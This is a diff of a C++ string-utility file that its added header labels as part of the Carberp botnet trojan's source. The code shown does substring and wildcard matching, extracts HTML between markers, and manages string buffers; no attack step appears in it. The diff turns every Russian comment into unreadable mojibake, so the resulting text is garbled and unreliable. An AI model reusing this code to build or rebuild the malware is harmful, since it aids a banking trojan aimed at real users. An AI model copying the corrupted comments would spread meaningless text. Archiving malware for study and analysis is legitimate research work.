@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "Memory.h"
@@ -443,7 +454,7 @@ char * WINAPI m_strstr( const char * _Str, const char * _SubStr )
 
 int WINAPI m_istrstr( const char * _Str, const char * _SubStr )
 {
-	// Функция ищет подстроку _SubStr в строке _Str
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ _SubStr пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ _Str
 	if( !_Str || !_SubStr )
 		return -1;
 
@@ -453,20 +464,20 @@ int WINAPI m_istrstr( const char * _Str, const char * _SubStr )
    //	size_t slen  = m_lstrlen( (char*)_Str );
 	size_t sslen = m_lstrlen( (char*)_SubStr );
 
-	// Проходим циклом до конца строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	char *p = (char*)_Str;
 	while (*p != 0)
 	{
 		char* k = (char*)_SubStr;
 
-		// сравниваем первые символы
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if ( *p == *k )
 		{
 			char* p1 = p;
 			char* k1 = k;
 
 			s = 0;
-            // Определяем количество совпадений
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			while(*p1 != 0 && *k1 != 0)
 			{
 				if (*p1 == *k1)
@@ -482,7 +493,7 @@ int WINAPI m_istrstr( const char * _Str, const char * _SubStr )
 			}
 		}
 
-		// смещаем указатели
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		p++;
 		j++;
 	}
@@ -611,8 +622,8 @@ wchar_t *m_wcslwr( wchar_t *Str )
 
 bool WildCmp( char *Buffer, char *Mask, LPDWORD dwStart, LPDWORD dwEnd, LPDWORD dwLen )
 {
-	// Фуекция ищет в строке подстроку.
-	// подстрока может содержать символ, маску *
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ *
 	if ( !Buffer || !Mask )
 		return false;
 
@@ -631,7 +642,7 @@ bool WildCmp( char *Buffer, char *Mask, LPDWORD dwStart, LPDWORD dwEnd, LPDWORD 
         STR::Free(TempMaskBuf);
 	}
 
-	// Разбиваем подстроку на аргументы между *
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ *
 	DWORD ArgsCount = 0;
 
 	char *Context;
@@ -649,7 +660,7 @@ bool WildCmp( char *Buffer, char *Mask, LPDWORD dwStart, LPDWORD dwEnd, LPDWORD 
 
 	if ( ArgsCount == 1 )
 	{
-		//  масок нет, просто ищем вхождение подстроки
+		//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD Start = m_istrstr( Buffer, Mask );
 
 		if ( Start != -1 )
@@ -664,7 +675,7 @@ bool WildCmp( char *Buffer, char *Mask, LPDWORD dwStart, LPDWORD dwEnd, LPDWORD 
 		}
 	}
 
-    // Сравниваем с учётом масок
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	int Start = m_istrstr( Buffer, Args[0] );
 
@@ -729,7 +740,7 @@ bool CompareUrl( char *MaskUrl, char *Url )
 //----------------------------------------------------------------------------
 PCHAR GetTextBetween(PCHAR &Buffer, PCHAR Before, PCHAR After )
 {
-    // метод возвращает кусок HTML кода между блоками Before и After
+    // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Before пїЅ After
 	if (StrIsEmpty(Before) || StrIsEmpty(After))
 		return NULL;
 
@@ -743,7 +754,7 @@ PCHAR GetTextBetween(PCHAR &Buffer, PCHAR Before, PCHAR After )
 		if (WildCmp(StartPtr, After, &Start, &End, &Len ) )
 		{
 			PCHAR EndPtr = StartPtr + Start;
-			// Смещаем указатель буфера на позицию за найденным текстом
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			Buffer = EndPtr;
 
 			DWORD Size = EndPtr - StartPtr;
@@ -772,7 +783,7 @@ namespace STRHEAD
 
 	PCHAR MakeHead(PCHAR Buf, DWORD BufSize, DWORD Length)
 	{
-		// инициализировать заголовок строки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR Res = Buf + HeadSize;
 		PHead H = (PHead)Buf;
 
@@ -819,8 +830,8 @@ namespace STRHEAD
 
 PCHAR STR::Alloc(DWORD StrLen)
 {
-	// Выделяет в памяти блок под строку размером StrLen. Блок памяти будет
-	// иметь размер StrLen + 1 (плюс размер заголовков)
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ StrLen. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ StrLen + 1 (пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 
 	if (StrLen == 0) return NULL;
 
@@ -834,8 +845,8 @@ PCHAR STR::Alloc(DWORD StrLen)
 
 DWORD StrCalcLength(char *Buf)
 {
-	// Функция расчитывает длину строки проходя по ней в поисках
-	// нулевого символа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buf == NULL)
 		return 0;
 
@@ -863,8 +874,8 @@ DWORD StrCalcLength(char *Buf)
 
 PCHAR STR::New(PCHAR Source, DWORD CopySize)
 {
-	//  Создать новую строку на основе Source (создаёт дублика строки Source)
-    //  Размер исходной строки высчитывается
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Source (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Source)
+    //  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Source == NULL) return NULL;
 
@@ -885,15 +896,15 @@ PCHAR STR::New(PCHAR Source, DWORD CopySize)
 
 void STR::Free(PCHAR Str)
 {
-    // Уничтожить строку.
-	// Важно!!! Строка должна быть создана с помощью функции STR::New
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅ!!! пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ STR::New
     if (STRHEAD::CheckSignature(Str))
 		HEAP::Free(Str - STRHEAD::HeadSize);
 }
 
 void STR::Free2(PCHAR &Str)
 {
-	// Уничтожить строку и обнулить переменную
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Free(Str);
 	Str = NULL;
 }
@@ -902,9 +913,9 @@ void STR::Free2(PCHAR &Str)
 
 DWORD STR::Length(PCHAR Str)
 {
-	// Функция возвращает длину строки.
-	// Если строка создавалась с помощью функции STR::New то размер
-	// получается из заголовка строки в противном случае размер расчитывается.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ STR::New пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	if (Str == NULL)
 		return 0;
@@ -919,10 +930,10 @@ DWORD STR::Length(PCHAR Str)
 
 void STR::UpdateLength(PCHAR Str, DWORD RealLength)
 {
-	// Обновляет значение длины строки в её заголовоке.
-	// !!!!Только для строк созданных через STR::Alloc (STR::New)
-	// Если значение RealLength не указано то новая длина
-	// расчитывается до нулевого символа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// !!!!пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ STR::Alloc (STR::New)
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ RealLength пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!STRHEAD::CheckSignature(Str)) return;
 	if (RealLength == 0)
 		RealLength = StrCalcLength(Str);
@@ -933,7 +944,7 @@ void STR::UpdateLength(PCHAR Str, DWORD RealLength)
 
 void STR::Delete(PCHAR Str, DWORD Position, DWORD Count, DWORD StrLength)
 {
-	// Удаляет Count символов с позоции Position строки Str
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Count пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Position пїЅпїЅпїЅпїЅпїЅпїЅ Str
 	if (StrIsEmpty(Str) || Count == 0)
 		return;
 
@@ -957,11 +968,11 @@ void STR::Delete(PCHAR Str, DWORD Position, DWORD Count, DWORD StrLength)
 //------------------------------------------------------------------------------
 void StrSetLength(PCHAR &Str, DWORD NewLength)
 {
-	// Изменить размер буфера строки
-	// Важно!!! Функция работает со строками которые созданы функцией STR::New
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ!!! пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ STR::New
 
-	// Для переопределения длины строки, мы создадим новую строку с нужным
-	// размером и скопируем в неё старую.
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	if (!STRHEAD::CheckSignature(Str) || STRHEAD::GetBufferSize(Str) == NewLength)
 		return;
@@ -979,8 +990,8 @@ void StrSetLength(PCHAR &Str, DWORD NewLength)
 
 bool StrIsEmpty(PCHAR Str)
 {
-	// Функция возвращает истину если на входе нулевой указатель либо
-	// пустая строка
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return (Str == NULL || *Str == 0);
 }
 //------------------------------------------------------------------------------
@@ -1010,7 +1021,7 @@ PCHAR StrLongToString(DWORD num)
 
 void StrConcat(PCHAR &Str1, PCHAR Str2)
 {
-	// Объеденяем две строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Str2Len = StrCalcLength(Str2);
 	if (!STRHEAD::CheckSignature(Str1) || Str2Len == 0)
 		return;
@@ -1028,7 +1039,7 @@ void StrConcat(PCHAR &Str1, PCHAR Str2)
 //------------------------------------------------------------------------------
 void StrConcatArguments(PCHAR &OutStr, DWORD Count, PCHAR *First)
 {
-	//  Функция объеденяет две и более строки.
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	const DWORD MaxCount = 50;
 
@@ -1039,7 +1050,7 @@ void StrConcatArguments(PCHAR &OutStr, DWORD Count, PCHAR *First)
 	DWORD FullLen = StrCalcLength(OutStr);
 	Lens[0] = FullLen;
 
-	// Расчитываем общую длину строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	for (DWORD i = 1; i <= Count; i++)
 	{
 		DWORD Len = StrCalcLength(*Current);
@@ -1048,16 +1059,16 @@ void StrConcatArguments(PCHAR &OutStr, DWORD Count, PCHAR *First)
 		Current++;
 	}
 
-	// Добавляемые строки нулевой длины
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (FullLen == 0) return;
 
-	// Меняем размер буфера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (OutStr != NULL)
 		StrSetLength(OutStr, FullLen);
 	else
         OutStr = STR::Alloc(FullLen);
 
-	// Собираем строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Current = First;
 	PCHAR Tmp = OutStr + Lens[0];
 	Current = First;
@@ -1073,7 +1084,7 @@ void StrConcatArguments(PCHAR &OutStr, DWORD Count, PCHAR *First)
 
 PCHAR STR::New(DWORD Count, PCHAR Str...)
 {
-	// Функция создаёт строку объеденив несколько строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR Result = NULL;
 	PCHAR *First = &Str;
 
@@ -1086,8 +1097,8 @@ PCHAR STR::New(DWORD Count, PCHAR Str...)
 
 void STR::Copy(PCHAR Source, PCHAR Destination, DWORD Position, DWORD Count)
 {
-	// Копирует с позиции Position строки Source Count символов в
-	// строку Destination
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Position пїЅпїЅпїЅпїЅпїЅпїЅ Source Count пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ Destination
 	if (Source == NULL || Destination == NULL)
 		return;
     m_memcpy(Destination, Source + Position, Count);
@@ -1096,9 +1107,9 @@ void STR::Copy(PCHAR Source, PCHAR Destination, DWORD Position, DWORD Count)
 
 void StrConcat(PCHAR &Str1, DWORD Count, PCHAR Str2...)
 {
-	//  Функция объеденяет две и более строки.
-	//  если размер буфера строки Str1 меньше необходимого,
-	//  то строка Str1 будет переопределена
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+	//  пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Str1 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	//  пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Str1 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Str2 == NULL)
 		return;
 	if ((Str1 != NULL) && !STRHEAD::CheckSignature(Str1))
@@ -1110,10 +1121,10 @@ void StrConcat(PCHAR &Str1, DWORD Count, PCHAR Str2...)
 //------------------------------------------------------------------------------
 bool StrCopy(PCHAR Dest, PCHAR Source, bool UpdateLen)
 {
-	// функция копирует строку Source в строку Dest
-	// Флаг UpdateLen использовать только если Dest создана функциями
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Source пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Dest
+	// пїЅпїЅпїЅпїЅ UpdateLen пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Dest пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	// StrAlloc, STR::New
-	// Возвращает истину если скопирован хотя-бы один байт
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	if (Dest == NULL || Source == NULL)
 		return false;
@@ -1132,7 +1143,7 @@ bool StrCopy(PCHAR Dest, PCHAR Source, bool UpdateLen)
 
 int StrCompare(PCHAR Str1, PCHAR Str2)
 {
-    // Сравнить две строки
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Str1 == NULL || Str2 == NULL)
 		return -1;
 
@@ -1167,7 +1178,7 @@ int StrCompare(PCHAR Str1, PCHAR Str2)
 //------------------------------------------------------------------------------
 PCHAR STR::Scan(PCHAR Str, char C)
 {
-	// Функция возвращает указатель на символ С;
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ;
 	if (Str == NULL)
 		return NULL;
 	PCHAR Tmp = Str;
@@ -1180,7 +1191,7 @@ PCHAR STR::Scan(PCHAR Str, char C)
 
 PCHAR STR::ScanEnd(PCHAR Str, char C)
 {
-	// Функция возвращает указатель на последний символ С
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
 	if (Str == NULL)
 		return NULL;
 
@@ -1212,7 +1223,7 @@ inline bool IsStrEnd(PCHAR Str, DWORD Len, DWORD Pos)
 
 int STR::Pos(PCHAR Str, PCHAR SubStr, DWORD StrLen)
 {
-	// Функция ищет подстроку _SubStr в строке _Str
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ _SubStr пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ _Str
 	if( !Str || !SubStr )
 		return -1;
 
@@ -1223,20 +1234,20 @@ int STR::Pos(PCHAR Str, PCHAR SubStr, DWORD StrLen)
 	DWORD sslen = StrCalcLength(SubStr);
 	DWORD Pos = 0;
 	DWORD Pos1 = 0;
-	// Проходим циклом до конца строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR p = Str;
 	while (!IsStrEnd(p, StrLen, Pos))
 	{
 		PCHAR k = SubStr;
 
-		// сравниваем первые символы
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if ( *p == *k )
 		{
 			char* p1 = p;
 			char* k1 = k;
 			Pos1 = Pos;
 			s = 0;
-			// Определяем количество совпадений
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			while(!IsStrEnd(p1, StrLen, Pos1) && *k1 != 0)
 			{
 				if (*p1 == *k1)
@@ -1253,7 +1264,7 @@ int STR::Pos(PCHAR Str, PCHAR SubStr, DWORD StrLen)
 			}
 		}
 
-		// смещаем указатели
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Pos++;
 		p++;
 		j++;
@@ -1264,7 +1275,7 @@ int STR::Pos(PCHAR Str, PCHAR SubStr, DWORD StrLen)
 
 PCHAR STR::GetLeftStr(PCHAR Str, PCHAR SubStr, bool IncludeSubStr)
 {
-	// Получить строку слева
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	int Pos = STR::Pos(Str, SubStr);
 	if (Pos < 0)
 		return NULL;
@@ -1276,7 +1287,7 @@ PCHAR STR::GetLeftStr(PCHAR Str, PCHAR SubStr, bool IncludeSubStr)
 
 PCHAR STR::GetRightStr(PCHAR Str, PCHAR SubStr, bool IncludeSubStr)
 {
-	// Получить строку справа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int Pos = STR::Pos(Str, SubStr);
 	if (Pos < 0)
 		return NULL;
@@ -1300,7 +1311,7 @@ int StrToInt(PCHAR Str)
 
 void StrLowerCase(PCHAR Str)
 {
-	// Функция приводит строку к нижнему регистру
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Str == NULL)
 		return;
 
@@ -1319,7 +1330,7 @@ void StrLowerCase(PCHAR Str)
 
 int StrIndexOf(PCHAR Str, bool CaseSensetive, DWORD Count, PCHAR Cmp...)
 {
-	// Функция ищет позицию строки в массиве строк Сmo
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅmo
 	if (Str == NULL || Count == 0 || Cmp == NULL)
 		return -1;
 	PCHAR *Cur = &Cmp;
@@ -1344,10 +1355,10 @@ char LowerChar(char C)
 
 bool StrSame(PCHAR Str, PCHAR ToSame, bool CaseSensetive, DWORD StrEndPosition)
 {
